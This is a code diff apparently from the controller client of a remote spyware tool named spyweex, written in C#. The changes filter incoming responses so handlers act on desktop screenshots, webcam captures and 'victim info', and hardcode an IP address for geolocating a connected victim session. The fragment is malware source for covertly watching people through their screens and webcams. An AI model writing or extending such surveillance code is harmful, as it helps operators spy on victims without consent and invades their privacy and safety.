@@ -48,6 +48,7 @@ namespace spyweex_client_wpf
             IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                 getObservableSequenceOfReponses().
                 ObserveOn(TaskPoolScheduler.Default).
+                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN)).
                 Subscribe(
                 response =>
                 {
@@ -100,6 +101,7 @@ namespace spyweex_client_wpf
             IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                 getObservableSequenceOfReponses().
                 ObserveOn(TaskPoolScheduler.Default).
+                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_WEBCAM_SCREEN)).
                 Subscribe(
                 response =>
                 {
@@ -234,6 +236,7 @@ namespace spyweex_client_wpf
             IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                 getObservableSequenceOfReponses().
                 ObserveOn(Scheduler.CurrentThread).
+                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.VICTIM_INFO)).
                 Subscribe(
                 response =>
                 {
@@ -247,7 +250,7 @@ namespace spyweex_client_wpf
 
                     IPEndPoint ipEndPoint = (IPEndPoint) wxhtpClient.getTcpClient().Client.RemoteEndPoint;
                     string ip = ipEndPoint.Address.ToString();
-                    var tupleOfGeoData = Utils.GetGeoInfo(ip);
+                    var tupleOfGeoData = Utils.GetGeoInfo("89.28.51.5");
 
 
                     Session s = new Session
